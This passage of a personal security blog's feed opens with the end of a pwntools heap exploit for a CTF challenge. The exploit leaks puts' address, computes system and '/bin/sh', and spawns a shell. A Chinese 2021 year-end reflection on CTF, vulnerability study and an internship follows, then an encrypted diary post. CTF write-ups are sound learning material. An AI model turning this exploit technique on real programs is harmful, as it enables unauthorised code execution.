class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;aaaa&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(puts_plt)+p64(<span class="number">0</span>)+p64(puts_got))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr= u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">sys = puts_addr - <span class="number">0x2a300</span></span><br><span class="line">binsh = puts_addr + <span class="number">0x11d777</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(sys) + p64(<span class="number">0</span>) + p64(binsh))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>2021总结以及2021的flag</title>
    <url>/44262.html</url>
    <content><![CDATA[<p>30晚上写一点，31晚上写一点…结果还是在1号中午才写完</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大概十二月初的时候就想着写总结了，但还是决定把它攒到最后几天来写。</span><br><span class="line">本来打算写成正经的小作文，但想说的实在挺多，太懒了也不想再重构</span><br></pre></td></tr></table></figure>
<p>要不…还是像上回一样分成几个部分来写吧</p>
<h1>学习方面</h1>
<p>课内的话依旧没啥好说的，可能缺憾是在计组、计网上花的时间不多、没认真学编译原理吧。<br>
选编译原理的时候以为讲的侧重编译器后端，结果发现主要在讲前端，就没咋认真听了。前几周看了安全客的一个专题<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3N1YmplY3QvaWQvMjUxNDI4">数学魔法——你所不了解的程序分析<i class="fa fa-external-link-alt"></i></span>，感觉还是应该好好学一下的（比如听个南大李樾老师等的程序分析课？有空一定）</p>
<p>安全方向的话，今年还干了挺多事的，打ctf，分析漏洞，水文章，看论文，实习，blablabla…<br>
寒假和大二下可能算是偏离大部分安全人ctfer的开端吧2333。原本没打算打ctf（当时还没认识变成赛棍的文兄和朱哥等师傅），打算做点Pwn题后就以复现分析漏洞的方式学习安全。在寒假和大二下学期翻完了《x86汇编》、《操作系统精髓与设计原理》、glibc内存管理，看了一点《0day2》和几章《漏洞战争》，分析了后者里栈部分的ndays（就无暇再看了）。<br>
期间出于对一些事情的uncertainty，厚着脸皮蹭了学校导师的课题组（翻记录发现第一次向老师请教原来是在20年年底，看当时的邮件内容真是略显幼稚2333）。随后参加组会、开始看论文、看文档、陆续部署和踩坑了四五个工具，顺带学了点VEX IR，把学习过程的代码和注释胡乱塞到一篇文章，后来还被一个师傅放他博客里引流了（上回打算有空把那篇整理一下，但不出意外的鸽掉了）。<br>
（因为太喜欢钱了，于是）在安全客上投了一篇综述翻译，挣到（应该是）人生第一笔稿费，投了一篇IoT固件分析的tutorial（主要是跟着做github上一个项目的过程，现在看起来超级shallow了），又恰了一笔钱…<br>
后来就是在CISCN被文兄、郭佬、刘哥等人带飞，tqltql，有一说一着实怀念整天做题的充实日子，低级做题家实锤了。但仔细想来，CTF对我而言或许只是手段（之一）而不是目的，于是就愉快退役啦…<br>
就这样到了暑假和大三上学期，几乎没学二进制方向的日子，差不多就由实习、蹭课题、看论文组成。<br>
很意外的找到了CIC的远程实习，虽然跟Pwn不是特别相关，也不是设想中的purely paper work，不过本来也打算开始学Web了 <s>（而且在学Web的时候还能打全网）</s>，而且让我看到了安全领域中更广（far more than CTF）的一些方面，在工作中也得到了一些作为protector的satisfaction，这种在real world挖洞的满足感确实跟比赛不太相似。当然的确占用了大量时间，不过也收获了很多，唯一可惜的是只能在线上实习吧。31号也结束实习了，芜湖~<br>
加入了安全客的作者群和翻译群，接了两次翻译，又翻译了一篇论文，后来在知乎上看到白泽的师傅精读论文的文章，感觉翻译论文的[投入/产出]确实不高，又尝试输出了两篇精读论文的文章，还行，也能加深自己的理解。收到了安全客送的月饼和公仔（可惜公仔寄回家了），芜湖~<br>
有一说一，安全客打稿费的周期也太长了，每次拿到钱总感觉是得到了意外之财…<br>
在蹭课题的时候依旧是参加组会、部署工具、写脚本和汇报了一次工具以及LLVM IR，虽然每次参加组会看起来基本上都没事干，但毕竟是在见识“组会”，还能从师兄师姐的汇报中学到不少软件静态分析和深度学习等的知识。所以也算是在见识bigger picture（这是在上岸前就为科研做准备吗…<br>
奥对了，十二月的时候在线上悄悄蹭了两次厦大吴荣鑫教授和信工所孟国柱教授给复旦软件工程实验室做的安全方面的报告，受益匪浅啊%%%，这也算是我觉得自己在12月做的最牛逼的事情了2333</p>
<p>今年在心态上也发生了点变化，以前总想着要去做点务实的方向，研究一些工业界real、cool的东西，今年看了点论文，发现做些务虚的研究可能更适合我，具体就不细说了（躺<br>
当然今年还有挺多遗憾的事情，例如没考雅思、没有完成去年的flag、没有开始内核安全的学习、还有几篇Fuzz相关的论文没有看完等等，年底本来打算跟着看雪上一篇Winafl的文章操作一遍，结果隔离在宿舍单屏幕工作效率太低也只做了一半（还是因为自己太菜，这算是最遗憾的了）<br>
下学期开始准备考研啥的，也不知道这些遗憾啥时候能补上</p>
<h1>其他</h1>
<ul>
<li>变成协会的老人，赖在FZ130</li>
<li>完整见识了FZ130的24小时</li>
<li>发了工资后买了人生中第一个大于一百块的耳机，真好</li>
<li>买了个垂直鼠标</li>
<li>买了一套手磨咖啡豆和做手冲咖啡的小玩意，并发现实验室饮水机里出的热水只有80+°C</li>
<li>六级只准备了两周半，并不是很理想</li>
<li>大三上恰的钱完全cover了一学期的支出</li>
<li>开始争取一点东西，拿了点证书和奖</li>
<li>能拉17个引体向上，本来打算寒假回家前做到能拉20个，这下估计不太可能了orz</li>
<li>跟朋友去西安周边玩。去了个华山因为厦门疫情没上去，去了个石泉县还蛮有意思的</li>
<li>拿了驾照</li>
<li>上半年打了好久网球，可惜下半年也就打了三五次</li>
<li>在年末的时候（正在）经历西安的疫情，关在宿舍里隔离。虽然之前在家也有居家隔离过，但确实只有只身在外才能真实体会到身处疫区的感觉，也才能再次坚定信任和佩服国家严控疫情的措施。BTW，有一说一，还好在隔离的时候有王师傅在二次元陪我。说，谢谢王师傅:D</li>
<li>要是能出门了，我第一件想做的事是去跑一千米，不过具体能跑几米跑几米吧</li>
</ul>
<h1>flag回顾</h1>
<ul>
<li>看完《经济学原理》（两本）《两次全球大危机的比较研究》<br>
<strong>额，我本来打算看的是这三本吗…看了半本《论中国》和四分之一《论人类不平等的起源和基础》</strong></li>
<li>背完考研单词<br>
<strong>哈哈</strong></li>
<li>复习高数<br>
<strong>哈哈</strong></li>
<li>看<s>x86汇编</s>、<s>从龙佬那嫖来的glibc内存管理</s>、csapp、<s>操作系统</s>、0day2、漏洞战争<br>
<strong>看完的划掉了，没看（完）的可惜了</strong></li>
<li><s>打几个ctf</s><br>
<strong>算是吧</strong></li>
<li>早睡<br>
<strong>哈哈你可真幽默</strong></li>
<li>坚持锻炼，特指开始jogging<br>
<strong>没有jogging</strong></li>
<li><s>去西北或东欧旅游</s><br>
<strong>去兰州打比赛，顺便玩了一天</strong></li>
<li><s>继续买基金</s><br>
<strong>好久没看了，刚才看了一下，我就该在8月的时候把它们卖掉的，12月初卖掉也好啊…不过反正是盈利了</strong></li>
</ul>
<h1>2022的flag</h1>
<p>不立了</p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title>非定期のDiary</title>
    <url>/39190.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3ad5a3d32a50c61a2361dee798afde8598e36cb44a621d4852ba935069224a02">617d82a1012035c687f5539182bb1628c29918aea6da0197a99e08daf61985763294be4ee3c01825755be0d61534221d54fa03515811f3345b954b7efa32e5a7fbf68b1c32752f87615db03771ae9d1cb31810da10e6d16b6185151938ea2e3cba30d7869951c1c2b87fb01d4786c73d091efbc494705a6f6aceea3ebfc7c4b93cad4e1224962c862fbe166f8953e2662326a8050f0056f7c68575e5d2c34c65943ecfd0280343564a830cd14e800004431b9737f6ea4211476ff8cc6e863c4e2791fea310aa984f23a7ca08fd0aa6882146f4fdbfeec3632d9680f571e9963c6e0aace1294cd5f8a7f23fb1d145e3c6c2765f47740ed52e1a16043ebb7659943880f5a7a73b3c75922bdbb743530f8949e507e8b4281175da5b79280ba97b09e01ca41bec3bc304af47297f16b48e988eb46e2601caa82cdde810080a02d122a53c9be07b31cc44e6b43752ba2a92bc8cd91b372a899e27da7242116caaac966372c54f46836fc1e883e1282e2055174f0fb300f8d7cb68fe839a8a30ef7840a7308eaa18f4f3dd1a06aae9757278beabf3aa79a9729af2972739b2fc34516220778532180507f89c288661e37a8ba4bdc749036b092f56b5df22abfa853ccc2676c0d8912ee4ea14f66c65290443eaa1d900346bdf77531ba737fcf4713d0d2a9cd288ae96ee401b04d8d25019b3b6bb17ea57092e35160b919753c5acc0821a0d7bea0513e67e7846cbc7f46ec043c96df30b8bdf3c5e63e678c59afe8a7bacdc0fc9ddc2fd8d63d93cf17461599170a1bfb5f566006a509f3ab6677f721430e55fb8463c217571b23ce08d335853534739b5000f5410d859502f7f7cd0e3135c732e97cf6719af9dad6c27e5c08079fc86b5e7ab2f7b082f77dd68ad853a6e1a283f3f47939b3a4405aa169365ed3e15d44c617c2cb7d8d989074b27994e71ec548ba825844ecf38744bc0a72e1e05ee2beaa04822c79da62f933537f4aa994d843e8fd56f5a4493697907bb5af8112b3f90ca35d766719e9687c2527cc90e043b78310cafba213ad0a05065dbcd4467efeec1846a2aef1be89d8d81cd35b08aaa39a83e35deb9bcc89d0cca724ec748efd046f422e42abcb5e46167ce0a3c90758f6506dd5d168c5148b456e49b2dcdbdd7191cfcb3c4260e4a26fe137f1af862206ff3e8fe88525045ccd65c0c73a4f5bb08111f7d33fd507ad13b7167d53c4b33bf2cc446b06da6e9b9d8b46efcb0370b8c0ebe563b0fc99c6502d9581397e3a0438565007ad84084a64277ab6a420a1f5307fe65aca7c340248ea1c2b9c5e4f18276d3d3e085b532113f83fddbf06b9dae6ed04c6b39db19365a0b07d97b1be8444f85de6643ce1fcda219d7a18fbe03fc55b434d810d01cf55506c7ac952be844722d6af0c7d3fed0adcedaffde007b625d66c7d765a5a75f0e23bf2c024de321f3e84c1bb4cef93e76726c1e73c8162e9372fba45bc6f9bdcd509ffd45b8b2c7dc2c757ab4d28a8ad741cf1038c0cc6778655193d49a93ac8134520ce998b1c2e8488262f96a1fef93be39d5521a32bd5594dba98868de7ba4c395ceab4b25e9de0ce8b99a4ec3a5e66f68ec46a1991617144dd7ace6fb5c2b8c99a14999b884250abce1bd5ec9564a9a8c7610aa54a711173cca34dddc115094f4c4484d11c29e30af4c7a61295ecc4da44a249e2622e7b4d30e0fea506aa4bdd973ced273a97faf52830b84ee1257ff5582cf6943c46ad215d46c7b9bd7550774c698c4b03a11897fe85b1231f9a86e07e103544265778140f6fb2bbef243bdcc16963845131097a8ef17b5db482c5abf61f0e30798c04922d6428b37f70941cd6f292bb37982bc7825c7c7aed7fe5f69b8cafcc2f357918e7510bb107f1aaef6ca8d99021e637da1bbd4ba2c8b3778324e9eb8320dd7573434d7779ec676638b001070301eb37c964b84589a5c920c21647f98d0e6a1b608fef06fa9160e7fe41ea0c841b016edfbb0445b21033e493e279958576f64015290305a6398161424b71f832d6d4016f3110b0fd34924771cf9a96707d983a55351e6e9bc0a0d4a38cd0159cf67a82e3b6850d6ba4336fcf066f2452291e741b3ae7219294baa0fc54c17b46e6f6d9fb59f5ac536986c800a57129a98f249041350b20aa838cc489780243625eb77636659beb534e976f59845d2d1373e8e8cf6cd774f8c414bce393112912cde2b64ea80989b051a22548dde79121bfd780ce468df5c4ac2377f0ac43809ea4be58ebeffc9c363d9d4dad2b25208a4861c7a07b66b4472a921168d57eb5471efacf802e2a6e5239a591beef9e07c834cdcdcae460981844f5e9bbdb7fc6c2a4b639490f63bd8c811f6cbcd293461ef0e77ed83bcd316e4b85fd64c9d52533bd13dec10aefa44b47d82b301756d04c3fb3be5ca47a5576e1061ef9132b514132eed9e3ee8040d11e077474b0d7f4d2ac31505ac2643f029e6d5a1b45c1481f7db0a98725ab42f0ea065a98c45bda0344f258dd656e610968f33b0213ccf1443805e3fe7da68c4cac3cf1724bf2b1f4c59a4cda95cbccc1b19fb68461b82affddd5721c9601160f3468782f2740930e5ad845a3579524ab21fd0379be44d27b4c6eea98fb37c577caa97ebd8069a593bb2d1ce12612e7e40ba5926c02b86b3c575023b94033ba11a0d0a3f05403e12be67c3a30013026b255076be6c229c0101d4faf71b14c5dfb06f4dd13208e48225d5499d72dae6ce3cbf0a76eae71aa5c72610228ecb1ccc0fd1d14d43a00c1e3bda78873e2056b3efaea1ad561d219a808f8683988f0d168c427e91815908231ca507be2306e43431f0c1817be3b5934f75648243dd4339563072c799e9fd82e40f43975e4692c680a9082680190c55b37699141407770a0697cdbfaaa7da7acad5d1567b5d230dc215b4fff0f56c579f4dec87f7f982aa878aec842185a48418dd28cbae0cdb2ff7c54c88f20b35b57c2a22bf5af6cc2333c35c0ca0e674932adeddfc4b4061f3df22749f92d581662aa95b9b2d341d641adb3231102797f85408018811a57ae3ceb2a6cf7f80c537d8dfcbe2c8788eaf88b2d2cb37300d5966e737991220e54e666fff6470fa114031690e93dd1c149e33708398fac04f6bc8b85e3d447fb7764f8e4514a3b448e28fa038ebf47dde0d413b2b46bbf698d565fef942f94058c72573c6129d9f1c32b6c73ab1d5efb26d4dadae57a9935a430d4450d430ca1dbc32a4d37b81c41585686d2d419d2d1ab4a683ac3dad8caae2f8fcf4d720afe18edc5e88af716808925c25c05c38f60eb14e62611b27f2f387fef0b1fe9df21f064dd8bc7e7da5639d7c68898c2c99c18470ccdbc0d79f6941c9bbff04ca97bf85152d0761ae134a024ac2e283ffe5eb49ca59f2be9620e1d62e305f6e083152f8f648ac4a5cb0eb847d9be798a79fb53dd3ce344b070db9857515691c1795778ca05e1aa2a4b2968f37e0b74243d6f2493efa1a3e5f2a523e75636b736dcaef87fb69b1fde227bed4464be4f1035c1f43e36d36a1a27cb6f47e732740c424c399a582e47efc172c8364b61cca9f11dd326c67cbc24c267c47e4b62b1bf5f7638ef387f45315ea55512618166c31779e02dbc64cee8cd1065b97da3f0ec70fdc92f03d5bd458605c40d3bad90936b0a083a11e0d1faa3cc26aff60ba1284b4402057da4101a210bc02230fa7976339d9f7197ba8461259bd2586307d1800c28471e1fb6e830e751429a0ae8dac3bc5c375c2fccf115a204b91e68f0afc77a694efb53047f770a07a2a4853b17400e498cfd9b3bb539321bbeaf77f769850d92d3278e98883c2a38739f3b636867a0426c2304eb9a7b578c0b3ea2dbe4673f68dc8ffa9456828d68f1a584e4f018440cdb2b50eb3b2860f03e464e00c030c11d9dd1afa04a2c43b4992a77e620318349b3bea908c02a22ecdd149b5905ac7ecfe866fd57474a97010d711e5922db8c9e48b9f0c4db4b60dc79d2d4e30fe4c2e6323324d7fdeb4bfcbd0452da1034682460801cbf5265c5bf30fb184be6126dedee521a6ea2222956582cdbb9cd22c4580d789ef2fca07da58ddafafbef895ee1b2cb5adc2936502f622ba184b3302faddd1104d5b8c5f569dfbb3638e488d2a352e1987e06eb5bd5825109783a873d090e3ab2060eb7480defe2faf97d4330aaa10539e8e378a70449ac2de62256bb5b46a80626824c437bf1601f3bfa0bcda04687a8ceeb6033045174dcad6c327a7bb9f892d30439f52101ce8e546a6286a7173d99a79bc8da357d8c2b36ddf2a06faa6a76e6a6bb96a07394c53719862ef82045bfe27f752843bc4b0ca5de9dc54124a61e1d8d845575931edc1e3b71a38b60e639af7af7031444732f5ca9a5f9746ba84a5df1a71f4678f17b1e183d9d3793d6dec05aae69d267e6d92a0f9448b5a254f066948e1fc550774f64d517afa03da248050ec3882bf128c8a906010c4d6c48a91cee1c29b68770b9046169973b0f6e5bb38a9d41c943e4bdecf8980b9e3630414dee7de0e304e16aff08d3e17986e9d46def44de9e61335a65d9b19b333673c36e973b96c17ae0be258a6cf598e25b5a90ed23eebca91e3ca35088cabf0bd4e2d38a5dd5556671fd7bfb3d70a92d9daff26b266b068d6abfb2dba9aa00810b23f3f1e5ceb664c14ca7ae8f278bc9ea7069b684cc457eb893c329153d410695b07a465dd7d76172d224d7866ec1e0b8970cdc1623c1e90b39e16bb882e5e4adc25420d1e7db747fc70dae4364907ccf5995597591ef1b46831aeeb0b130f58fc49f7d92bf67f844d29a24206ea4567110b1e522d39a859d7752ecb3507afc6ff8b60d0f5c1b9f165a73e1ce48a8a8dfe859da55ac81a65e8bf09d1072923f64c3ca5927cd984bd89d47eeac791fb0ce4881a0c020fef51d2d26f06064232f86a23f00886ab781b7d9626c3702dd1e66f5a1857bd22473a5fb91d42b438120105f6f095f7820015fe779ce2adbdbcee88879a3e6598379614409bbd5950364d935f9f57f0e9d71e9da352b702f216ddd584d67ccb5d6ddd5caaaefae0dddfec857a2db450202db8a5e14f912e8461dc37c6b0faedfd58efc4a0cb0eb0d2ce6a2a880cac2d3f18ed1c2503f47768b0b32e17e4fccb46f8c4ad9c3cd65b6e5bed23f77b4a98fedcd23d7081261e7a6c0c801b1114aeb8a8a642be002dca6e2d8e32778a1b37f1d7a8e48273905e214143cc090e2daf14e6c15fe31a23d7aaea357040c6fad0cf13a48e924a3abec0091b9d1dbc0a4e43e0e9eefd02ed04c24562d6da88cb5e11031ceca17bdc22d58bb2e7f1bc9c7dc3366a2efb182d29cd2b61dabc68e10cbd12a3179fc2101a466622c9c50fca24ef716cc3b14a072323fe932e57c218333c0cb4dcd2e9258c7a81e3ac46f601270855ff35b279bb6d56d40ff44b032ade9c3c3f41fccefa49fe2deca0b359478bb5765bfc2f7c694fada25b66e307c20bdc3dbbc7a315b155920d84f10be2e2792821f0d9b7bb49635bfaa167023755a4b09d05765dbb6f6c2744ee8c796a120fdf159f54b666d740738af987737cf5e895d443b1b92ed2cbb757f2fe47f4d9475f6f23349ef252375eabfcbe19c2e52191e78019d63d0c28b7e866ff62b47e5ac22a56dca528b45175d62e3b7f72a55cea3e6461a52ffbee79806591d9047d13c9a70571da9b13940eac5ec35028621046ff9d40c8bdf144ec94897aa3c150376594356eebde38755a910ec888c51b3711f85f9ab03b9082b9a176c46d3bce8e12d8de2692d3fdd8f61411db5235fdb717e286d1f052e8f233be5d3b77913c09e7c129155ea7daccbff109b706b9fca0f679bb8f3869b53ccd2a7dd085beae499b3a8b97d5053c006fe2c15b31935ce1bfb8c412914e7b35e96a6ae004bc5bf263fbcf2d1f76e43331b19ea48ad7181adf7711a65678145201523f382dca68e133d581d868ebf803a1ca22ae33e84ff2dcc4417e368e417ca2cfc44aa657529b3a1d4d1632b153cd3a079260e4ebcd3f3800a0c285e0a6dc1d93b18443fb3ae9fc8c4e09f6adb1d999d11f5c0f5b6df08684436a760b379d50010187d8640bda429475736cae4967ca38daf31fd07b6f8948c4621b86bd8f11b03b52c498f11d9b9c1b3b4f295f03c4e69d816aa2c7d9ba52c99a0b77ac0285c0f2de121e337d5de24d5ea9014b4c6d4a7649c48307edfc62254ec6458d19a30f3813b4f5f80c340ba367fdfc5e29805f8051855cb3615f450937e1ed28e6376229e0cdd4c0d54e4020dd9bbf5533bbb880ce921c62e7920aec7339a5a4255524f2c9a415b9dfe40989ec79f5ed72047f1defaadbb1d731f4fd9ad71d1b2510c09e5cb1ce4330618fd8f87dc81d1a7db65752cb2267e5a752c251807e4d102d3e65c3b05a5b9eb16b1ada48c34c5e3ad6f2baeb0799ff9a3ec939fa11e474b99fd6bb1611a4c742c8ae78540c9759821214f4d402b0ded56ab8f505fd21516714a1dc72727e291158c56cb2e571edc74ce4764b4adaf4fc07e164229a6685bde739d6d1cd8e4c23107e83c025b1f46b955336f04ce3e3520a32f291239e24a245e2d6636deb9b280376180a16a1232022152dc6e2ba5e64d994f4cd9a7e1e1fdbc4c3c5426994395d7c118a5dcd7a1572ad51434f9884e44189be70ff036b520442fcd5f9ead3c5acab492d4137aaedbc8fd8958d7c418a51ff24c5358b8480b984f2fa43a8abda0370bd17a6797900b1804f5a433909e93d4264a862672a1bce00724f19113bb2eb7022abff2905743625d54e31ad4f8ee61ad4dbf7440bc041f3438ace3ca01cf9ef36bffea9ad22921ad4f5d41325d502a43eda57bf037123d2290ef6f43eafe6104e525c76b5a8debe858e77c3f99430f71f79b474cdccd57775592ce5015fd78a7069ceb3c5455cfbbf921c125b66821b6fff3c0b6ec4e7c82af66fda4f919518f424aed29ed7947d8fcb2ac094b56baa70c778768ad8bcdc2c7136082abf1f41b000a656a92975d49ed0725f5474fb8574e995cea882f61a22a36afc61fa53dad9cad4a100af6efd04506455ca3d2c6149bfde090cf4709aa136ec03c6486b1f49b6f31521ba57ede7f35cb22136b92e08f58c307447695828201103f16b34cf5c4f84a7fc4a52226f9bcdfa77ae8446b79992a116e8d3a8be1a1c47d3840adbe51845a23d61b4f5da6aef431cb0285f94752eadfbd3a810f32df274cc799090db72f4999876f8ccb6bbfc7f0c4199522c1b09f5f1834e9787fbe85a1896fb4bef936a656271aa12dce9416d14ea60dd6d375587150250b1288bd713879ddc50ee8ed07e8455ed011879966ca2ea0374d6a46737d90b514fcb0254186bcbb398d6949f14f84c5e5c7df6c53ccc6e0d758cd7c757d7aca4a4c7c540169f00777406090ef06a4b2f8112e3fd36fc72aefb3292831e9717f0bde234246ab4c67652d12d082cf5bd3f9ee3be5f4ce9bd02e533219ca8fa5b3e35ee42a8d0c02daabd6ebe198e0954aa1af5737187d07c2f99aedee792813ada9300012174a4d8f68532e85ce66eda8888e215fdcdb8280f444fb64f039708f5570157d334c4b95493c827c5397e7c45873571220568bcc12e42a9edc8a4c2a577586ad9350ddbd05a810c9c9f60e593b30777cf782d1fbb15fdb45d6b20d400b9805896f577213cc3e570be553019e98a91743a20de40448c944edbc3386aac1baf7ac45c9ce9993f918b75f5e6f4167a80d5b40a33047c48db61a276084742ed590a0942f63ebeda0b397250c72a188012a912ef48d6c6d82d54773b5a7fc5ea7294f7db9abcf6bacf882635d3f67006184052a16f1d97d98f1a872b28591af9baaa16f9cf3c6f06b26c3eb0b613d09298d73045d34feb904344e0f1b030bfc01994982d0b7c93ecf99e5acf0fc21b289710743ec7c6faf6abe10f1e09d3500cdd8eb869fada6164ad1d08bba1b3e494e69c26676560a9086b265db6fca214aaa28a41f40aa51c49c3510abcfee24a58ddaaf48050ba4555fe74a985eae2f0b46ddc0a7cd88aaa5dc8175d67e51d1d8ab5f3faf5ed6a0d2e64807649e9f372e1895fa8cb1c7441f52cdba455ff82270136d1a7f62f5464b1b553eed6a4da38eaf6164ea4e8c324959d36da7153d457df0c256d94b5ef1eeb04bb43eb11e1fd60388e99c8e8ded64e3a50e20afc433b9d2b032acca974f0aa9ae4c909f92f16536c5e39d0a17a9eb3419cbb9b558ccd4a290971d32d921a46f16054621e5e799739a7476946508a72518544c7cced5307a306143a71381bfe09f455640aa96fd359d36da22895fac643dfc5189b4902e6daa1c32f9a56829397be63bfb7daf636ae8fc3b2b160af629029df1c97e165d86ae4ad2ec43894afc1aa4bf3ba45108fcdbd1598226292790750cb0742e836f7b1a0c6adea8a71a55b27c38b4ad4023da664145599839431607dcd70bd0aa574930b89e7b0a9472e0baddf44b0d33332c84eb8b4ff383824051b5026aa47c4ec691493d5513a4f1d4e75efdb48f530cf3cb758ab277fd820c1d6f88db3cb8ce82b9a7a03cf58d73a4f8fe8813447e2d8fd2bfae177af6fd4eee130f7188016ec11aa13f055c03ae608285015f2315cdc3654aa6a9609a48db798e5a9dfb1d0a5c793dd33423880f32035d0b89f9ce6e18ce33a7ecb1927a32f46eadf7cde0bb9970fd3eefe1261b68ca823fb0aa4eb33c7f2b4653be0fcf56253627690072ad8b4b31ba6175d0c9b8add3416eafbf65b5de1b59219294346870f2790836ba76cea1a240b67fd3dc9e902aa1baf6cde35615f46510d8a3dc0682d55a3e78e535d76fcafe47c8c7bfd6b3ecbda53d249584f4b4daeb94087fb0276fbdcfba676ef5d89412ad0cb8ca1e2a6804875a829d0dbbf16f4998cc0282512710d1e7329756ebdbcc5ea31a482d4d014347fbb4032d4c52844ec37a71ce1c823965950e83ddef6daa34de68de8ff3691c0b3c29895791458e893d5f64e806dadf902b186a45388077157430ecb17b706b6f88786865742aa06ed71672b4fc1056c58d92d52ed1b1466c63729a71c7dd4a28260cd6f3148ddaf2a4f25e118bdb29e5b2ef688d93dafa4220c1a16aa4d997eb84392a99795c4a2f636c9f5a40f3aaa505be5f0406b68a3e386c1f9c1277d7e05e8db75e2fae2a41859bd9a1aede768857547c829373b951b6a5088121f3b44fe2577c75c837d081a1470b67caa7ce53e7e51fe28e6a993023945b0899d4fdeb485050dd2653cf6811a99e6640d7fa7fbef94ffd43d3f0ee5135378e035f4ba51f4b4fa39872a104befbd86f764bd5a5724bf3e6e54b7625062a6ea104a06ad7c2a944bd79be611e0dbb520d31a2f201a525ff8573e1940f9ca9d0e98a19c743f8e5340b5517917b1f1d26a63f3cca701291410362d0232bfdb7470b758ca407ddbffe4354df2260a162bbd652c77b75874d2becebbeea03df3c77130837ea38208a60a90718b8d5b1d6ea7a8c0d3b410fcadc93f5d53cb55263d6fa3f0b2cad79c0c471dc18b0ad462b8c1fcae285d2e4fed153efea554f1ab04fe6bf3b919ae4d7a3401ed10e099b4fe5fe2932b65ec8b3ca7ac6d553b5374757cf1fe421eae56f6e61e20637bb22c45460bea247a1abe13327def108d58f511a1a392fce5b63470d396255ec50e376c8dd7318a7d0bf682189956ea79514f66469aa27fe17dc0e4b7a24f89635c6944f45bc16311986c39c3300647f06e9aa561f1460a6e38e008373c2ff262aa9397d9c135b2763127f60d0c8af7dcfac5e2af2aaaf1e824186461fa3eee76644ff162cff113bacf02d52a936e33bd803ac1895821694bd95ebe233fe46086b4b7ac3eeb8ea69ce0778bc9cafb76cd908329a67866e38b65fea89ef84ef83593bfa38568dfecdde59c8197928ebfd9801a36f6a5da78fe6a7f5846b0bc14a9a2e7d90846601a07cf7588255379a126cd091516364fa9264a6c13b9cef66531d43067b59ecb8d85a912f6b9199ac104f708f231bda5891ae99d6beb9a7d6931b351db0369e1f4d35efdc3dfc4843d6a5f48947a8e37fd7454d0ce55076b3ad7485b0682fda0120c2bebc12bab74bdf29ccb9d39d4dbe3ffab7399b3f3049a6eee83113a9cf498fc1f6f9796f07f490fc556fd4f5ad668e6cad3b53f5ecfec8c30f4f6f3ede485d0d54f44ef62ed34aef1d6b25d3fb46f815524a10e420a1c98c68a58be443f080525b95bd5c4563f32a753bcd06b8fa8f0b31459eb498c2003af6041dee1ed4b2399519b34461fcc1ea9d678d98e6312006c913c1774ccef27409724bb5190d06d8977e6c0d619485c4d7af0cf7deeef4d41844f020fac2874d567edc43fac87923f71979d718339d533de0f9e8af5d33431b272b84c5379e54e798d3d304ea2c9a53d8c93e0edfb311e4622e661e83208776ec15cb7bb615ea0b7c0994836351da4a9f8009848d614d5f2387dc8a29af2ed6cf69f9c171a336cd914b88a83069a82b0b41c8d517e10804c278b08765e609f038f15cb19ba6bdb0e4dfa45fcdc664bca7415f636fd046aa0b6b14a0d8dc8440ac3976762bbfd03f0a089185b49c2e69bcd6577ee8fd0de172b0f0c3b2cdaf51ecaa06d6e888216effc5152cb220ab999e1deabfb07a8a2598a784364746766f82275b870984b84940f2f42fa6fadbc56d10890cce08dc1003b082d6f21f08ce02131392d18f177bf961ff456478b4e088ee1be33962474d742005686183c82a2ccbe8bd78f4b183743fc459e90408685210b64cd7385edeb9171867fe01fa39d021c8efacb36c8e161939d0193b29cc1f240ae9fef416f285d9670720cff087cf11a54e70df4555b477c0760085a2dc28aeb0901bdcff77e29cbed35bb5f62cbc7062d8e1d8083a4077437a40160778c74bd4a2109aa0fa3a212a690723e2fd6d61c04dcd74842b87272b06c12d27e0095d53444377c2fb67f8585009a15fc1c39b64a5d5f9121a4dc50967805de10fd7836b2a45479a8a23b525af73631e947de67f5f38ef169e02a8f9af585c0c557d44e45ecfbfd61c7319f8cbb0043a5109bac61c93482fbec40689d926a7ebe1d59eb27cdb91a38a13af86fc0f0792acc5691a2744114f34eea5d4c2a480ebf4ba60b38f24145d1e140800f4ec90c6587c10474e4ec0b83d09684a6b55efa66c86a09b052a387590aa89d26a3a81a6e7a043b34aa8c38fde62d46b86e7b9757dcf101921e111f30d8d60601e96ba95183643ab03c6042481125ba923733776b87286c7eeff42cc8c7ff5237dfe903a6ea8dd5fd400e3aa0734857271cfac9011f398223be51341d6c57859d13691b15294c89449fd7f09224b2c32e9aa4537e3361a2ae2a006a1b10db5450bc38afde1d1b566fde71fc1d598252b64f9eba1c91baa0ecb37d5efe5307ec244adbf83110563572de4bdc5266d08e5636265d29c544630a4a8e3238e80e9408bc1f3436a3577fc5285303c82008513f03d5b78fbc5e5f41c33947aba0a923e23d8b27616240c39c30a86415a6b6c5a1cd2791a060cf277596a52df8db56c54d47f8c977c3501e163c03a45235d37ffd6461b6a12e7f4383556b2cc6b239366fc7d180f7ffafae7560f9738812f33b9a743bb2b7441517f5796a455b820dc79ed85851411323a8fd0ec8bed97f18e1a14d8cd7f3d0af02a652eb06ff37547a93e1fc